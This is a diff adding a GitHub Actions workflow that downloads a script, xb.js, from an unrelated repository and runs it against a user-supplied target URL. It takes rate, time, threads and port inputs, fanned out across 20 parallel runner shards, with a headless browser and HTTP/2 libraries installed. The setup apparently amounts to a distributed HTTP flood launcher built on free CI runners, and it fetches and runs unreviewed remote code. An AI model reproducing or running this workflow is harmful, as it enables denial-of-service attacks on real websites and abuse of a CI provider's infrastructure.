@@ -1,0 +1,63 @@
+name: Run xb.js
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        description: "Target URL"
+        required: true
+        type: string
+      rate:
+        description: "Rate"
+        required: true
+        type: number
+      time:
+        description: "Time"
+        required: true
+        type: number
+      threads:
+        description: "Threads"
+        required: true
+        type: number
+      port:
+        description: "Port"
+        required: true
+        type: number
+      data:
+        description: "Request body (optional)"
+        required: false
+        type: string
+      method:
+        description: "HTTP Method (optional)"
+        required: false
+        type: string
+
+jobs:
+  run:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    env:
+      NODE_OPTIONS: "--max-old-space-size=8192"
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-node@v7
+        with:
+          node-version: '24'
+      - name: Download xb.js
+        run: wget https://raw.githubusercontent.com/A03219026/repo-z57godx0/refs/heads/main/xb.js
+      - run: npm install puppeteer-real-browser hpack
+      - run: |
+          sudo apt update
+          sudo apt install -y wget gnupg ca-certificates
+          wget -qO- https://dl.google.com/linux/linux_signing_key.pub | sudo gpg --dearmor -o /usr/share/keyrings/google.gpg
+          echo "deb [arch=amd64 signed-by=/usr/share/keyrings/google.gpg] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google.list
+          sudo apt update
+          sudo apt install -y google-chrome-stable
+      - run: echo "CHROME_PATH=/usr/bin/google-chrome" >> $GITHUB_ENV
+      - run: echo "PUPPETEER_EXECUTABLE_PATH=/usr/bin/google-chrome" >> $GITHUB_ENV
+      - run: chmod +x xb.js
+      - run: node xb.js "${{ inputs.url }}" "${{ inputs.time }}" "${{ inputs.rate }}" "${{ inputs.threads }}" "${{ inputs.port }}"
